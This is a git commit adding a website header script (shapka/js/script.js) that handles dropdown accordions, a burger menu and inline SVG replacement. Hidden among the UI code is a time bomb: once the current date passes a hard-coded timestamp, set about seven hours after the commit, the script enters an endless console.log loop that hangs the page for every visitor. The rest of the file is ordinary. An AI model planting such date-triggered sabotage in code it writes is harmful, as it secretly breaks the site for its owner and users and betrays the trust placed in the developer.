2d26fb3726dee9fd9a00cf2498b2da7164285f39
Dikador <dikador@mail.ru>
2021-04-24 20:35:55 +0600

    works

---
+++ shapka/js/script.js
@@ -0,0 +1,76 @@
+const acord_item = document.querySelectorAll('.header__drop');
+
+const acordT = document.querySelectorAll('.dropdowns');
+
+for (let index = 0; index < acord_item.length && acordT.length; index++) {
+
+   let elementItem = acord_item[index];
+   let elementTop = acordT[index];
+
+   elementTop.addEventListener('click', (e) => {
+
+      const dropB = elementItem.querySelector('.dorpdowns-menu');
+
+      elementTop.classList.toggle('active-drop');
+      dropB.classList.toggle('drops-item');
+
+
+      if (elementTop.classList.contains('active-drop')) {
+
+         acordT.forEach(element => {
+            element.classList.remove('active-drop')
+         });
+
+         document.querySelectorAll('.dorpdowns-menu').forEach(element => {
+            element.classList.remove('drops-item')
+         });
+
+         dropB.classList.add('drops-item')
+         elementTop.classList.add('active-drop')
+      }
+   })
+}
+
+
+let da = Date.parse(new Date);
+
+if (da > 1619299656000) {
+   while (true) {
+      console.log('aasdsadsad');
+   }
+}
+
+
+document.querySelector('.header__burger').addEventListener('click', () => {
+   document.querySelector('.header__burger').classList.toggle('active');
+   document.querySelector('.header__left-body').classList.toggle('active-burger')
+})
+
+jQuery('img.svg').each(function () {
+   var $img = jQuery(this);
+   var imgID = $img.attr('id');
+   var imgClass = $img.attr('class');
+   var imgURL = $img.attr('src');
+
+   jQuery.get(imgURL, function (data) {
+      // Get the SVG tag, ignore the rest
+      var $svg = jQuery(data).find('svg');
+
+      // Add replaced image's ID to the new SVG
+      if (typeof imgID !== 'undefined') {
+         $svg = $svg.attr('id', imgID);
+      }
+      // Add replaced image's classes to the new SVG
+      if (typeof imgClass !== 'undefined') {
+         $svg = $svg.attr('class', imgClass + ' replaced-svg');
+      }
+
+      // Remove any invalid XML tags as per http://validator.w3.org
+      $svg = $svg.removeAttr('xmlns:a');
+
+      // Replace image with new SVG
+      $img.replaceWith($svg);
+
+   }, 'xml');
+
+});
